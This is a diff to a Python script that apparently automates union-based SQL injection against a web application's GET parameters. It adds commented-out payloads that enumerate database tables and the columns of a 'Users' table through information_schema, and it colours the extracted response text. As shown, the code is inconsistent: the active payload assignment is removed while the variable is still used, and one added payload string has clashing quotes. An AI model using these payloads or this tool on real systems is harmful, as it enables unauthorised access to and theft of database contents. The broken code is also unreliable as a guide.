@@ -105,8 +105,13 @@ def get_union_based_injection(query_params, base_url):
         soup = BeautifulSoup(response.text, "html.parser")
         class_elements = soup.find_all(string=True)
         
-        for element in class_elements:
-            print(f"[{element}]")
+        for element in class_elements:            
+            if element in marker_to_find:
+                print(f"[{colored(element, GREEN)}]")
+            elif element == '\n':
+                pass
+            else:
+                print(f"[{colored(element, RED)}]")
         
         # print(f"{colored(response.text, GREEN)}")
         
@@ -114,16 +119,14 @@ def get_union_based_injection(query_params, base_url):
         # print(f"Extracted values: {marker_to_find}")
         # print(response.url)
         
-        
-        payload = "' UNION SELECT CONCAT('DB_START:',DATABASE(),':DB_END'), NULL, NULL -- -"
+        # payload = "2' UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema=DATABASE()-- -"
+        # payload = "2' union select 1,group_concat(column_name),3 FROM information_schema.columns where table_name="Users" --+-"
         params = query_params.copy() if isinstance(query_params, dict) else {}
         
         param_name = list(params.keys())[0] if params else query_params
         params[param_name] = payload
         response = requests.get(base_url, params=params)
         
-        test = BeautifulSoup(response.text, 'html.parser').find_all(string=True)
-        for text in test:
-            print(f"{colored(text, YELLOW, styles=BOLD)}")
+        print(response.text)
         # # print(f"{colored(response.url, RED, styles=BOLD)}")
 
